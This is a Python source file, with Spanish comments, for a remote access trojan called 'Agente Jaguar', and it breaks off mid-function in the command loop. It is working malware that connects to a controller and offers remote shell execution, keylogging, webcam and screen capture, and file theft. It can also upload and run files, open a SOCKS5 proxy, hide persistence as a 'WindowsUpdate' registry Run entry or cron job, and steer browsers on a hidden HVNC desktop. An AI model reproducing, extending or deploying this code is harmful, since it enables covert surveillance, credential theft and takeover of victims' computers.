# -*- coding: utf-8 -*-
"""Agente Jaguar. Se conecta al controlador y ejecuta comandos."""
import base64
import hashlib
import hmac
import io
import json
import os
import platform
import random
import shutil
import socket
import struct
import subprocess
import sys
import tempfile
import threading
import time

HOST = "0.0.0.0"
PORT = 8000
SLEEP = 3.0
JITTER = 0.2
NOMBRE_CLAVE = "WindowsUpdate"

_WIN = platform.system() == "Windows"
_KLOG = []
_KLOG_ON = False
_PROXY_ON = False
_SALIR = False
_HVNC = {"pid": None, "hwnd": None, "hdesk": None, "navegador": None, "epro": None}
_WCAM = {"on": False, "frame": b"", "w": 0, "h": 0}

# ============================ CRIPTO JAGUAR ================================
_CLAVE_MAESTRA = b"J4GU4R-2026-clave-compartida"
_SAL = b"jaguar-v1"
_ITER = 100_000
_CI = None
_MA = None


def _cinit():
    global _CI, _MA
    if _CI is None:
        m = hashlib.pbkdf2_hmac("sha256", _CLAVE_MAESTRA, _SAL, _ITER, dklen=64)
        _CI, _MA = m[:32], m[32:]


def _ks(nonce, n):
    _cinit()
    out = bytearray()
    c = 0
    while len(out) < n:
        out += hmac.new(_CI, nonce + struct.pack(">Q", c), hashlib.sha256).digest()
        c += 1
    return bytes(out[:n])


def _xor(a, b):
    return bytes(x ^ y for x, y in zip(a, b))


def cifrar(datos):
    _cinit()
    if isinstance(datos, str):
        datos = datos.encode("utf-8")
    pad = os.urandom(os.urandom(1)[0])
    cuerpo = struct.pack(">H", len(pad)) + pad + datos
    nonce = os.urandom(16)
    ct = _xor(cuerpo, _ks(nonce, len(cuerpo)))
    mac = hmac.new(_MA, nonce + ct, hashlib.sha256).digest()
    return nonce + ct + mac


def descifrar(blob):
    _cinit()
    if len(blob) < 48:
        raise ValueError("trama corta")
    nonce, ct, mac = blob[:16], blob[16:-32], blob[-32:]
    if not hmac.compare_digest(mac, hmac.new(_MA, nonce + ct, hashlib.sha256).digest()):
        raise ValueError("MAC inválido")
    cuerpo = _xor(ct, _ks(nonce, len(ct)))
    return cuerpo[2 + struct.unpack(">H", cuerpo[:2])[0]:]
# ========================== FIN CRIPTO JAGUAR ==============================


def _recv(sock, n):
    b = b""
    while len(b) < n:
        c = sock.recv(n - len(b))
        if not c:
            return None
        b += c
    return b


def _enviar(sock, obj):
    d = json.dumps(obj, ensure_ascii=False).encode("utf-8")
    c = cifrar(d)
    sock.sendall(struct.pack(">I", len(c)) + c)


def _recibir(sock):
    cab = _recv(sock, 4)
    if not cab:
        return None
    (n,) = struct.unpack(">I", cab)
    d = _recv(sock, n)
    if d is None:
        return None
    try:
        return json.loads(descifrar(d).decode("utf-8"))
    except Exception:
        return {}


def _ip_interna():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        return s.getsockname()[0]
    except Exception:
        return "127.0.0.1"
    finally:
        s.close()


def _sysinfo():
    return {
        "host": socket.gethostname(),
        "usuario": os.environ.get("USERNAME") or os.environ.get("USER") or "?",
        "so": f"{platform.system()} {platform.release()}",
        "arquitectura": platform.machine(),
        "ip": _ip_interna(),
        "pid": os.getpid(),
    }


def _ping(a):
    return {"ts": a.get("ts")}


def _shell(a):
    r = subprocess.run(a.get("comando", ""), shell=True, capture_output=True, text=True)
    return {"salida": (r.stdout or "") + (r.stderr or ""), "codigo": r.returncode}


def _sysinfo_h(a):
    return _sysinfo()


def _listar_dir(a):
    ruta = a.get("ruta", ".")
    try:
        salida = []
        for e in os.scandir(ruta):
            try:
                salida.append({"nombre": e.name, "dir": e.is_dir(),
                               "tamano": e.stat().st_size})
            except Exception:
                salida.append({"nombre": e.name, "dir": e.is_dir(), "tamano": 0})
        return {"ruta": os.path.abspath(ruta), "items": salida}
    except Exception as e:
        return {"error": str(e)}


def _procesos(a):
    try:
        r = (subprocess.run(["tasklist"], capture_output=True, text=True)
             if _WIN else subprocess.run(["ps", "aux"], capture_output=True, text=True))
        return {"salida": r.stdout}
    except Exception as e:
        return {"error": str(e)}


def _captura(a):
    try:
        from PIL import ImageGrab
        img = ImageGrab.grab()
        buf = io.BytesIO()
        img.save(buf, "PNG")
        return {"b64": base64.b64encode(buf.getvalue()).decode(),
                "w": img.width, "h": img.height}
    except Exception:
        pass
    if _WIN:
        try:
            return _captura_win()
        except Exception as e:
            return {"b64": "", "error": str(e)}
    return {"b64": ""}


def _captura_win():
    import ctypes
    from ctypes import wintypes
    u = ctypes.windll.user32
    g = ctypes.windll.gdi32
    hwnd = u.GetDesktopWindow()
    hdc = u.GetWindowDC(hwnd)
    w = u.GetSystemMetrics(0)
    h = u.GetSystemMetrics(1)
    memdc = g.CreateCompatibleDC(hdc)
    bmp = g.CreateCompatibleBitmap(hdc, w, h)
    g.SelectObject(memdc, bmp)
    g.BitBlt(memdc, 0, 0, w, h, hdc, 0, 0, 0x00CC0020)

    class BIH(ctypes.Structure):
        _fields_ = [("biSize", wintypes.DWORD), ("biWidth", wintypes.LONG),
                    ("biHeight", wintypes.LONG), ("biPlanes", wintypes.WORD),
                    ("biBitCount", wintypes.WORD), ("biCompression", wintypes.DWORD),
                    ("biSizeImage", wintypes.DWORD), ("biXPelsPerMeter", wintypes.LONG),
                    ("biYPelsPerMeter", wintypes.LONG), ("biClrUsed", wintypes.DWORD),
                    ("biClrImportant", wintypes.DWORD)]

    bi = BIH()
    bi.biSize = ctypes.sizeof(BIH)
    bi.biWidth = w
    bi.biHeight = -h
    bi.biPlanes = 1
    bi.biBitCount = 32
    buf = ctypes.create_string_buffer(w * h * 4)
    g.GetDIBits(memdc, bmp, 0, h, buf, ctypes.byref(bi), 0)
    g.DeleteObject(bmp)
    g.DeleteDC(memdc)
    u.ReleaseDC(hwnd, hdc)
    return _buf_a_png(buf, w, h)


def _buf_a_png(buf, w, h):
    try:
        from PIL import Image
        img = Image.frombuffer("RGBA", (w, h), buf, "raw", "BGRA", 0, 1)
        b = io.BytesIO()
        img.convert("RGB").save(b, "PNG")
        return {"b64": base64.b64encode(b.getvalue()).decode(), "w": w, "h": h}
    except Exception:
        return {"b64": base64.b64encode(bytes(buf.raw)).decode(), "w": w, "h": h}


def _raton(a):
    if not _WIN:
        return {}
    import ctypes
    u = ctypes.windll.user32
    accion = a.get("accion")
    if "x" in a and "y" in a:
        u.SetCursorPos(int(a["x"]), int(a["y"]))
    if accion == "down":
        u.mouse_event(0x0002, 0, 0, 0, 0)
    elif accion == "up":
        u.mouse_event(0x0004, 0, 0, 0, 0)
    elif accion == "right_down":
        u.mouse_event(0x0008, 0, 0, 0, 0)
    elif accion == "right_up":
        u.mouse_event(0x0010, 0, 0, 0, 0)
    elif accion == "doble":
        for _ in range(2):
            u.mouse_event(0x0002, 0, 0, 0, 0)
            u.mouse_event(0x0004, 0, 0, 0, 0)
    elif accion == "scroll":
        u.mouse_event(0x0800, 0, 0, int(a.get("delta", 120)), 0)
    return {}


def _teclado(a):
    if not _WIN:
        return {}
    import ctypes
    u = ctypes.windll.user32
    UP, UNI = 0x0002, 0x0004
    if "vk" in a:
        vk = int(a["vk"])
        u.keybd_event(vk, 0, 0, 0)
        u.keybd_event(vk, 0, UP, 0)
    elif "texto" in a:
        for ch in a["texto"]:
            u.keybd_event(0, ord(ch), UNI, 0)
            u.keybd_event(0, ord(ch), UNI | UP, 0)
    return {}


def _webcam(a):
    try:
        import cv2
        cap = cv2.VideoCapture(0)
        ok, frame = cap.read()
        cap.release()
        if not ok:
            return {"b64": ""}
        ok, buf = cv2.imencode(".jpg", frame)
        return {"b64": base64.b64encode(buf.tobytes()).decode(),
                "w": frame.shape[1], "h": frame.shape[0]}
    except Exception as e:
        return {"b64": "", "error": str(e)}


def _webcam_iniciar(a):
    if _WCAM["on"]:
        return {"estado": "ya activo"}
    _WCAM["on"] = True
    threading.Thread(target=_wcam_loop, args=(int(a.get("cam", 0)),), daemon=True).start()
    return {"estado": "iniciado"}


def _wcam_loop(idx):
    try:
        import cv2
    except Exception:
        _WCAM["on"] = False
        return
    cap = cv2.VideoCapture(idx)
    while _WCAM["on"]:
        try:
            ok, frame = cap.read()
            if ok:
                ok2, buf = cv2.imencode(".jpg", frame, [cv2.IMWRITE_JPEG_QUALITY, 70])
                if ok2:
                    _WCAM["frame"] = buf.tobytes()
                    _WCAM["w"], _WCAM["h"] = frame.shape[1], frame.shape[0]
        except Exception:
            pass
        time.sleep(0.03)
    cap.release()


def _webcam_frame(a):
    return {"b64": base64.b64encode(_WCAM["frame"]).decode() if _WCAM["frame"] else "",
            "w": _WCAM["w"], "h": _WCAM["h"]}


def _webcam_parar(a):
    _WCAM["on"] = False
    return {"estado": "parado"}


def _keylogger_iniciar(a):
    global _KLOG_ON
    if _KLOG_ON:
        return {"estado": "ya activo"}
    _KLOG_ON = True
    threading.Thread(target=_klog_loop, daemon=True).start()
    return {"estado": "iniciado"}


def _klog_loop():
    if not _WIN:
        return
    import ctypes
    u = ctypes.windll.user32
    while _KLOG_ON:
        for vk in range(8, 256):
            if u.GetAsyncKeyState(vk) & 1:
                _KLOG.append(_vk_texto(vk))
        time.sleep(0.02)


def _vk_texto(vk):
    if vk in (13, 8, 9, 32, 16, 17, 18):
        return {13: "\n", 8: "[BS]", 9: "[TAB]", 32: " "}.get(vk, "")
    if 65 <= vk <= 90:
        import ctypes
        return chr(vk) if ctypes.windll.user32.GetKeyState(16) & 0x8000 else chr(vk + 32)
    if 48 <= vk <= 57:
        return chr(vk)
    return ""


def _keylogger_leer(a):
    global _KLOG
    txt = "".join(_KLOG)
    _KLOG = []
    return {"texto": txt}


def _carpeta_persistente():
    base = os.environ.get("APPDATA") or os.path.expanduser("~")
    ruta = os.path.join(base, "Microsoft", NOMBRE_CLAVE)
    os.makedirs(ruta, exist_ok=True)
    return ruta


def _instalar():
    carpeta = _carpeta_persistente()
    if getattr(sys, "frozen", False):
        origen = os.path.abspath(sys.executable)
        destino = os.path.join(carpeta, os.path.basename(origen))
        try:
            if origen.lower() != destino.lower():
                shutil.copy2(origen, destino)
        except Exception:
            pass
        return f'"{destino}"'
    origen = os.path.abspath(sys.argv[0])
    destino = os.path.join(carpeta, os.path.basename(origen))
    try:
        if origen.lower() != destino.lower():
            shutil.copy2(origen, destino)
    except Exception:
        pass
    return f'"{sys.executable}" "{destino}"'


def _persistir(a):
    try:
        if _WIN:
            import winreg
            comando = _instalar()
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                r"Software\Microsoft\Windows\CurrentVersion\Run",
                                0, winreg.KEY_SET_VALUE) as k:
                winreg.SetValueEx(k, NOMBRE_CLAVE, 0, winreg.REG_SZ, comando)
            return {"persistencia": f"HKCU\\...\\Run[{NOMBRE_CLAVE}]", "copia": comando}
        ruta = os.path.abspath(sys.argv[0])
        r = subprocess.run("crontab -l", shell=True, capture_output=True, text=True)
        if NOMBRE_CLAVE not in r.stdout:
            subprocess.run("crontab -", shell=True, text=True,
                           input=r.stdout + f"@reboot python3 {ruta}\n")
        return {"persistencia": "cron"}
    except Exception as e:
        return {"error": str(e)}


def _abrir_url(a):
    try:
        if _WIN:
            os.startfile(a.get("url", ""))
        else:
            subprocess.Popen(["xdg-open", a.get("url", "")])
    except Exception:
        pass
    return {}


def _mensaje(a):
    if _WIN:
        import ctypes
        txt = a.get("texto", "")
        threading.Thread(target=lambda: ctypes.windll.user32.MessageBoxW(0, txt, "Jaguar", 0x40),
                         daemon=True).start()
    return {}


def _descargar(a):
    ruta = a.get("ruta", "")
    with open(ruta, "rb") as f:
        d = f.read()
    return {"nombre": os.path.basename(ruta),
            "b64": base64.b64encode(d).decode(), "tamano": len(d)}


def _subir_ejecutar(a):
    d = base64.b64decode(a.get("b64", ""))
    ruta = os.path.join(tempfile.gettempdir(), a.get("nombre", "archivo.bin"))
    with open(ruta, "wb") as f:
        f.write(d)
    try:
        subprocess.Popen([ruta], shell=True)
    except Exception:
        pass
    return {"ruta": ruta}


def _proxy_iniciar(a):
    global _PROXY_ON
    if _PROXY_ON:
        return {"estado": "ya activo"}
    _PROXY_ON = True
    threading.Thread(target=_socks_loop, args=(int(a.get("puerto", 1080)),), daemon=True).start()
    return {"estado": "proxy SOCKS5 activo"}


def _proxy_parar(a):
    global _PROXY_ON
    _PROXY_ON = False
    return {"estado": "parado"}


def _socks_loop(puerto):
    srv = socket.socket()
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", puerto))
    srv.listen(20)
    while _PROXY_ON:
        try:
            cli, _ = srv.accept()
        except OSError:
            break
        threading.Thread(target=_socks_atender, args=(cli,), daemon=True).start()


def _socks_atender(cli):
    try:
        cli.recv(2)
        cli.sendall(b"\x05\x00")
        _, _, _, atyp = cli.recv(4)
        if atyp == 1:
            host = socket.inet_ntoa(cli.recv(4))
        elif atyp == 3:
            host = cli.recv(cli.recv(1)[0]).decode()
        else:
            host = socket.inet_ntoa(cli.recv(4))
        puerto = struct.unpack(">H", cli.recv(2))[0]
        remoto = socket.socket()
        remoto.connect((host, puerto))
        cli.sendall(b"\x05\x00\x00\x01" + socket.inet_aton("0.0.0.0") + b"\x00\x00")
        _relay(cli, remoto)
    except Exception:
        try:
            cli.close()
        except Exception:
            pass


def _relay(a, b):
    def bombea(src, dst):
        try:
            while True:
                d = src.recv(65536)
                if not d:
                    break
                dst.sendall(d)
        except Exception:
            pass
        try:
            dst.close()
        except Exception:
            pass
    threading.Thread(target=bombea, args=(a, b), daemon=True).start()
    threading.Thread(target=bombea, args=(b, a), daemon=True).start()


# ========================= HVNC — Desktop oculto (técnica KHVNC / RemoteHiddenDesktop) =============================
import ctypes
from ctypes import wintypes

_u32 = ctypes.windll.user32
_k32 = ctypes.windll.kernel32
_g32 = ctypes.windll.gdi32

DESKTOP_ALL    = 0x01FF
STANDARD_RIGHTS_REQUIRED = 0x000F0000
DESKTOP_ACCESS = STANDARD_RIGHTS_REQUIRED | DESKTOP_ALL   # 0x000F01FF
DESKTOP_NAME   = "JaguarHVNC"
_CLASES_BROWSER = ("Chrome_WidgetWin_1", "Chrome_WidgetWin_0",
                   "MozillaWindowClass", "ApplicationFrameWindow")

CREATE_UNICODE_ENVIRONMENT = 0x00000400
STARTF_USESHOWWINDOW       = 0x00000001
SW_SHOWNOACTIVATE          = 4
PW_RENDERFULLCONTENT       = 0x00000002

_VK = {"control": 0x11, "l": 0x4C, "return": 0x0D}


def _ruta_navegador(nav):
    nav = (nav or "chrome").lower()
    cands = []
    if nav in ("chrome", "google-chrome"):
        cands = [os.path.expandvars(r"%ProgramFiles%\Google\Chrome\Application\chrome.exe"),
                 os.path.expandvars(r"%ProgramFiles(x86)%\Google\Chrome\Application\chrome.exe"),
                 os.path.expandvars(r"%LocalAppData%\Google\Chrome\Application\chrome.exe")]
    elif nav in ("edge", "msedge"):
        cands = [os.path.expandvars(r"%ProgramFiles(x86)%\Microsoft\Edge\Application\msedge.exe"),
                 os.path.expandvars(r"%ProgramFiles%\Microsoft\Edge\Application\msedge.exe")]
    elif nav == "brave":
        cands = [os.path.expandvars(r"%ProgramFiles%\BraveSoftware\Brave-Browser\Application\brave.exe"),
                 os.path.expandvars(r"%LocalAppData%\BraveSoftware\Brave-Browser\Application\brave.exe")]
    elif nav == "opera":
        cands = [os.path.expandvars(r"%LocalAppData%\Programs\Opera\opera.exe"),
                 os.path.expandvars(r"%ProgramFiles%\Opera\opera.exe")]
    elif nav == "firefox":
        cands = [os.path.expandvars(r"%ProgramFiles%\Mozilla Firefox\firefox.exe"),
                 os.path.expandvars(r"%ProgramFiles(x86)%\Mozilla Firefox\firefox.exe")]
    for c in cands:
        if c and os.path.isfile(c):
            return c
    return nav + (".exe" if _WIN else "")


class _STARTUPINFOW(ctypes.Structure):
    _fields_ = [
        ("cb", wintypes.DWORD), ("lpReserved", wintypes.LPWSTR),
        ("lpDesktop", wintypes.LPWSTR), ("lpTitle", wintypes.LPWSTR),
        ("dwX", wintypes.DWORD), ("dwY", wintypes.DWORD),
        ("dwXSize", wintypes.DWORD), ("dwYSize", wintypes.DWORD),
        ("dwXCountChars", wintypes.DWORD), ("dwYCountChars", wintypes.DWORD),
        ("dwFillAttribute", wintypes.DWORD), ("dwFlags", wintypes.DWORD),
        ("wShowWindow", wintypes.WORD), ("cbReserved2", wintypes.WORD),
        ("lpReserved2", ctypes.POINTER(ctypes.c_byte)),
        ("hStdInput", wintypes.HANDLE), ("hStdOutput", wintypes.HANDLE),
        ("hStdError", wintypes.HANDLE)]


class _PROCESS_INFORMATION(ctypes.Structure):
    _fields_ = [("hProcess", wintypes.HANDLE), ("hThread", wintypes.HANDLE),
                ("dwProcessId", wintypes.DWORD), ("dwThreadId", wintypes.DWORD)]


class _RECT(ctypes.Structure):
    _fields_ = [("left", ctypes.c_long), ("top", ctypes.c_long),
                ("right", ctypes.c_long), ("bottom", ctypes.c_long)]


class _POINT(ctypes.Structure):
    _fields_ = [("x", ctypes.c_long), ("y", ctypes.c_long)]


class _BITMAPINFOHEADER(ctypes.Structure):
    _fields_ = [("biSize", wintypes.DWORD), ("biWidth", ctypes.c_long),
                ("biHeight", ctypes.c_long), ("biPlanes", wintypes.WORD),
                ("biBitCount", wintypes.WORD), ("biCompression", wintypes.DWORD),
                ("biSizeImage", wintypes.DWORD), ("biXPelsPerMeter", ctypes.c_long),
                ("biYPelsPerMeter", ctypes.c_long), ("biClrUsed", wintypes.DWORD),
                ("biClrImportant", wintypes.DWORD)]


class _BITMAPINFO(ctypes.Structure):
    _fields_ = [("bmiHeader", _BITMAPINFOHEADER), ("bmiColors", wintypes.DWORD * 3)]


# --- firmas correctas (crítico en x64 para no truncar punteros) ---
_u32.CreateDesktopW.restype = wintypes.HANDLE
_u32.CreateDesktopW.argtypes = [wintypes.LPCWSTR, wintypes.LPCWSTR, ctypes.c_void_p,
                                wintypes.DWORD, wintypes.DWORD, ctypes.c_void_p]
_u32.OpenDesktopW.restype = wintypes.HANDLE
_u32.OpenDesktopW.argtypes = [wintypes.LPCWSTR, wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]
_u32.CloseDesktop.argtypes = [wintypes.HANDLE]
_u32.SetThreadDesktop.argtypes = [wintypes.HANDLE]
_u32.SetThreadDesktop.restype = wintypes.BOOL
_u32.GetProcessWindowStation.restype = wintypes.HANDLE
_u32.EnumDesktopWindows.argtypes = [wintypes.HANDLE, ctypes.c_void_p, wintypes.LPARAM]
_u32.GetWindowRect.argtypes = [wintypes.HWND, ctypes.POINTER(_RECT)]
_u32.GetClassNameW.argtypes = [wintypes.HWND, wintypes.LPWSTR, ctypes.c_int]
_u32.GetWindowDC.argtypes = [wintypes.HWND]
_u32.GetWindowDC.restype = wintypes.HDC
_u32.ReleaseDC.argtypes = [wintypes.HWND, wintypes.HDC]
_u32.PrintWindow.argtypes = [wintypes.HWND, wintypes.HDC, wintypes.UINT]
_u32.ScreenToClient.argtypes = [wintypes.HWND, ctypes.POINTER(_POINT)]
_u32.PostMessageW.argtypes = [wintypes.HWND, wintypes.UINT, wintypes.WPARAM, wintypes.LPARAM]
_u32.MapVirtualKeyW.argtypes = [wintypes.UINT, wintypes.UINT]

_k32.CreateProcessW.argtypes = [wintypes.LPCWSTR, wintypes.LPWSTR, ctypes.c_void_p,
                                ctypes.c_void_p, wintypes.BOOL, wintypes.DWORD,
                                ctypes.c_void_p, wintypes.LPCWSTR,
                                ctypes.POINTER(_STARTUPINFOW), ctypes.POINTER(_PROCESS_INFORMATION)]

_g32.CreateCompatibleDC.argtypes = [wintypes.HDC]
_g32.CreateCompatibleDC.restype = wintypes.HDC
_g32.CreateCompatibleBitmap.argtypes = [wintypes.HDC, ctypes.c_int, ctypes.c_int]
_g32.CreateCompatibleBitmap.restype = wintypes.HBITMAP
_g32.SelectObject.argtypes = [wintypes.HDC, wintypes.HGDIOBJ]
_g32.GetDIBits.argtypes = [wintypes.HDC, wintypes.HBITMAP, wintypes.UINT, wintypes.UINT,
                           ctypes.c_void_p, ctypes.POINTER(_BITMAPINFO), wintypes.UINT]
_g32.DeleteObject.argtypes = [wintypes.HGDIOBJ]
_g32.DeleteDC.argtypes = [wintypes.HDC]

_ENUMPROC = ctypes.WINFUNCTYPE(wintypes.BOOL, wintypes.HWND, wintypes.LPARAM)


def _hvnc_crear_desktop():
    if _HVNC.get("hdesk"):
        return _HVNC["hdesk"]
    h = _u32.OpenDesktopW(DESKTOP_NAME, 0, False, DESKTOP_ACCESS)
    if not h:
        h = _u32.CreateDesktopW(DESKTOP_NAME, None, None, 0, DESKTOP_ACCESS, None)
    _HVNC["hdesk"] = h
    return h


def _hvnc_perfil(nav):
    ruta = os.path.join(tempfile.gettempdir(), "jaguar_hvnc_" + (nav or "chrome"))
    try:
        os.makedirs(ruta, exist_ok=True)
    except Exception:
        pass
    return ruta


def _hvnc_crear(exe, linea, desktop):
    """CreateProcess con lpDesktop = desktop oculto."""
    si = _STARTUPINFOW()
    si.cb = ctypes.sizeof(_STARTUPINFOW)
    si.lpDesktop = "winsta0\\" + desktop
    si.dwFlags = STARTF_USESHOWWINDOW
    si.wShowWindow = SW_SHOWNOACTIVATE
    pi = _PROCESS_INFORMATION()
    buf = ctypes.create_unicode_buffer(linea)
    ok = _k32.CreateProcessW(None, buf, None, None, False, 0, None, None,
                             ctypes.byref(si), ctypes.byref(pi))
    if not ok:
        raise OSError("CreateProcess fallo (%d)" % ctypes.GetLastError())
    pid = pi.dwProcessId
    try:
        _k32.CloseHandle(pi.hThread)
        _k32.CloseHandle(pi.hProcess)
    except Exception:
        pass
    return pid


def _hvnc_lanzar_explorer():
    exe = os.path.join(os.environ.get("WINDIR", r"C:\Windows"), "explorer.exe")
    return _hvnc_crear(exe, '"%s"' % exe, DESKTOP_NAME)


def _hvnc_lanzar(nav, url=None):
    exe = _ruta_navegador(nav)
    perfil = _hvnc_perfil(nav)
    objetivo = '"%s"' % url if url else "about:blank"
    linea = ('"{}" --user-data-dir="{}" --no-first-run --no-default-browser-check '
             '--disable-gpu --disable-software-rasterizer --new-window {} '
             '--window-size=1200,800').format(exe, perfil, objetivo)
    return _hvnc_crear(exe, linea, DESKTOP_NAME)


def _hvnc_buscar_ventana():
    hd = _u32.OpenDesktopW(DESKTOP_NAME, 0, False, DESKTOP_ACCESS)
    if not hd:
        return None
    halladas = []

    def cb(hwnd, lparam):
        try:
            if not _u32.IsWindowVisible(hwnd):
                return True
            cls = ctypes.create_unicode_buffer(256)
            _u32.GetClassNameW(hwnd, cls, 256)
            if cls.value in _CLASES_BROWSER:
                r = _RECT()
                _u32.GetWindowRect(hwnd, ctypes.byref(r))
                if (r.right - r.left) > 200 and (r.bottom - r.top) > 150:
                    halladas.append(hwnd)
        except Exception:
            pass
        return True

    _u32.EnumDesktopWindows(hd, _ENUMPROC(cb), 0)
    _u32.CloseDesktop(hd)
    return halladas[0] if halladas else None


# ---------------------------------------------------------------- handlers
def _hvnc_iniciar(a):
    nav = (a.get("navegador") or "chrome").lower()
    hdesk = _hvnc_crear_desktop()
    if not hdesk:
        return {"error": "no se pudo crear el desktop oculto"}
    _HVNC["hwnd"] = None
    _HVNC["navegador"] = nav

    def trabajo():
        # Igual que el KHVNC: el hilo se asigna al desktop oculto antes de lanzar.
        try:
            _u32.SetThreadDesktop(hdesk)
        except Exception:
            pass
        try:
            _HVNC["epro"] = _hvnc_lanzar_explorer()
        except Exception:
            pass
        time.sleep(1.0)
        try:
            _HVNC["pid"] = _hvnc_lanzar(nav)
        except Exception as e:
            _HVNC["error"] = str(e)
            return
        for _ in range(40):
            time.sleep(0.5)
            h = _hvnc_buscar_ventana()
            if h:
                _HVNC["hwnd"] = h
                break
    threading.Thread(target=trabajo, daemon=True).start()
    return {"estado": "arrancando", "navegador": nav, "desktop": DESKTOP_NAME}


def _hvnc_navegar(a):
    nav = (a.get("navegador") or _HVNC.get("navegador") or "chrome").lower()
    url = a.get("url", "")
    try:
        _hvnc_lanzar(nav, url)
        return {"estado": "navegando", "url": url}
    except Exception as e:
        return {"error": str(e)}


def _hvnc_captura(a):
    hwnd = _HVNC.get("hwnd") or _hvnc_buscar_ventana()
    if not hwnd or not _u32.IsWindow(hwnd):
        return {"w": 1, "h": 1, "b64": "", "estado": "sin ventana"}
    _HVNC["hwnd"] = hwnd
    r = _RECT()
    _u32.GetWindowRect(hwnd, ctypes.byref(r))
    w, h = r.right - r.left, r.bottom - r.top
    if w <= 0 or h <= 0:
        return {"w": 1, "h": 1, "b64": ""}

    hdc = _u32.GetWindowDC(hwnd)
    mdc = _g32.CreateCompatibleDC(hdc)
    bmp = _g32.CreateCompatibleBitmap(hdc, w, h)
    viejo = _g32.SelectObject(mdc, bmp)
    if not _u32.PrintWindow(hwnd, mdc, PW_RENDERFULLCONTENT):
        _u32.PrintWindow(hwnd, mdc, 0)

    bmi = _BITMAPINFO()
    bmi.bmiHeader.biSize = ctypes.sizeof(_BITMAPINFOHEADER)
    bmi.bmiHeader.biWidth = w
    bmi.bmiHeader.biHeight = -h
    bmi.bmiHeader.biPlanes = 1
    bmi.bmiHeader.biBitCount = 32
    bmi.bmiHeader.biCompression = 0
    buf = ctypes.create_string_buffer(w * h * 4)
    _g32.GetDIBits(mdc, bmp, 0, h, buf, ctypes.byref(bmi), 0)

    _g32.SelectObject(mdc, viejo)
    _g32.DeleteObject(bmp)
    _g32.DeleteDC(mdc)
    _u32.ReleaseDC(hwnd, hdc)

    datos = buf.raw
    try:
        from PIL import Image
        img = Image.frombuffer("RGB", (w, h), datos, "raw", "BGRX", 0, 1)
        bio = io.BytesIO()
        img.save(bio, "PNG")
        raw = bio.getvalue()
    except Exception:
        fila = w * 4
        size = 54 + fila * h
        cab = b"BM" + struct.pack("<IHHI", size, 0, 0, 54)
        dib = struct.pack("<IiiHHIIiiII", 40, w, -h, 1, 32, 0, fila * h, 2835, 2835, 0, 0)
        raw = cab + dib + datos[:fila * h]
    return {"w": w, "h": h, "b64": base64.b64encode(raw).decode()}


def _hvnc_raton(a):
    hwnd = _HVNC.get("hwnd") or _hvnc_buscar_ventana()
    if not hwnd:
        return {"estado": "sin ventana"}
    _HVNC["hwnd"] = hwnd
    accion = a.get("accion")
    if accion == "foco":
        return {"estado": "ok"}

    r = _RECT()
    _u32.GetWindowRect(hwnd, ctypes.byref(r))
    sx = r.left + int(a.get("x", 0))
    sy = r.top + int(a.get("y", 0))
    pt = _POINT(sx, sy)
    _u32.ScreenToClient(hwnd, ctypes.byref(pt))
    lp_cli = (pt.y << 16) | (pt.x & 0xFFFF)
    lp_scr = ((sy & 0xFFFF) << 16) | (sx & 0xFFFF)

    if accion == "move":
        _u32.PostMessageW(hwnd, 0x0200, 0, lp_cli)
    elif accion == "down":
        _u32.PostMessageW(hwnd, 0x0201, 1, lp_cli)
    elif accion == "up":
        _u32.PostMessageW(hwnd, 0x0202, 0, lp_cli)
    elif accion == "right_down":
        _u32.PostMessageW(hwnd, 0x0204, 2, lp_cli)
    elif accion == "right_up":
        _u32.PostMessageW(hwnd, 0x0205, 0, lp_cli)
    elif accion == "doble":
        _u32.PostMessageW(hwnd, 0x0203, 1, lp_cli)
    elif accion == "scroll":
        delta = int(a.get("delta", 120)) & 0xFFFF
        _u32.PostMessageW(hwnd, 0x020A, (delta << 16), lp_scr)
    return {"estado": accion}


def _hvnc_teclado(a):
    hwnd = _HVNC.get("hwnd") or _hvnc_buscar_ventana()
    if not hwnd:
        return {"estado": "sin ventana"}
    _HVNC["hwnd"] = hwnd
    if "vk" in a:
        vk = int(a["vk"])
        scan = _u32.MapVirtualKeyW(vk, 0)
        _u32.PostMessageW(hwnd, 0x0100, vk, (scan << 16))
        _u32.PostMessageW(hwnd, 0x0101, vk, (scan << 16) | (1 << 30) | (1 << 31))
    elif "texto" in a:
        for ch in a["texto"]:
            _u32.PostMessageW(hwnd, 0x0102, ord(ch), 0)
    return {"estado": "ok"}


def _hvnc_cerrar(a):
    for clave in ("pid", "epro"):
        pid = _HVNC.get(clave)
        try:
            if pid:
                subprocess.run(["taskkill", "/PID", str(pid), "/T", "/F"],
                               capture_output=True, creationflags=0x08000000)
        except Exception:
            pass
        _HVNC[clave] = None
    hwnd = _HVNC.get("hwnd")
    try:
        if hwnd and _u32.IsWindow(hwnd):
            _u32.PostMessageW(hwnd, 0x0010, 0, 0)
    except Exception:
        pass
    _HVNC["hwnd"] = None
    try:
        if _HVNC.get("hdesk"):
            _u32.CloseDesktop(_HVNC["hdesk"])
        _HVNC["hdesk"] = None
    except Exception:
        pass
    return {"estado": "HVNC cerrado"}


def _desconectar(a):
    global _SALIR
    _SALIR = True
    return {"estado": "adios"}


HANDLERS = {
    "ping": _ping, "shell": _shell, "sysinfo": _sysinfo_h,
    "listar_dir": _listar_dir, "procesos": _procesos, "captura": _captura,
    "raton": _raton, "teclado": _teclado, "webcam": _webcam,
    "webcam_iniciar": _webcam_iniciar, "webcam_frame": _webcam_frame,
    "webcam_parar": _webcam_parar,
    "keylogger_iniciar": _keylogger_iniciar, "keylogger_leer": _keylogger_leer,
    "persistir": _persistir, "abrir_url": _abrir_url, "mensaje": _mensaje,
    "descargar": _descargar, "subir_ejecutar": _subir_ejecutar,
    "proxy_iniciar": _proxy_iniciar, "proxy_parar": _proxy_parar,
    "hvnc_iniciar": _hvnc_iniciar, "hvnc_cerrar": _hvnc_cerrar,
    "hvnc_navegar": _hvnc_navegar, "hvnc_captura": _hvnc_captura,
    "hvnc_raton": _hvnc_raton, "hvnc_teclado": _hvnc_teclado,
    "desconectar": _desconectar,
}


def _bucle(sock):
    global SLEEP, JITTER
    while True:
        msg = _recibir(sock)
        if msg is None:
            return
        if msg.get("tipo") == "beacon":
            SLEEP = float(msg.get("sleep", SLEEP))
            JITTER = float(msg.get("jitter", 0)) / 100.0
            continue
        if msg.get("tipo") != "comando":
            continue
        cmd = msg.get("cmd")
